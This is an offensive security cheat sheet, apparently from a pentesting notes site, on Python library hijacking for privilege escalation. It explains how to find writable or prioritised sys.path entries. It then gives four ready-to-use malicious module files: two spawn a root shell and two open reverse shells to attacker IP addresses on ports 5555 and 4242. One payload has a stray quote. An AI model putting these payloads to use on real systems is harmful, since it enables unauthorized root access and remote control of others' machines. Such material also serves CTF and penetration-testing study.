# Library Hijacking

### Verification

* Possibility to run a Python script as root.
* The Python script must import at least one library. Example: `import sys`.
* Check the PATH to import Python libraries:

```bash
python # python3
>>> import sys
>>> sys.path
['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '...']
```

If we see that at the beginning there is `["`, it means that when searching for the libraries, it will start from the current directory, and if it does not find it, it will continue with the other PATHS.

There may also be cases (mostly in CTF) where you may find paths that have write permissions and have priority over other legitimate paths:

```bash
['/tmp', '/usr/lib/python310.zip', '/usr/lib/python3.10']
```

### Privilege Escalation

Create the malicious code with the name of the imported library:

{% tabs %}
{% tab title="#1" %}
{% code title="<LIBRARY_NAME>.py" %}
```python
import subprocess
result = subprocess.run(['bash'])
result.stdout
```
{% endcode %}
{% endtab %}

{% tab title="#2" %}
{% code title="<LIBRARY_NAME>.py" %}
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
{% endcode %}
{% endtab %}

{% tab title="#3" %}
{% code title="<LIBRARY_NAME>.py" %}
```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.50.72",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
{% endcode %}
{% endtab %}

{% tab title="#4" %}
{% code title="<LIBRARY_NAME>.py" %}
```python
import socket,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")'
```
{% endcode %}
{% endtab %}
{% endtabs %}

We place the payload in the corresponding directory (it can be the current directory or another one). Finally, we execute the Python script as root and that's it.
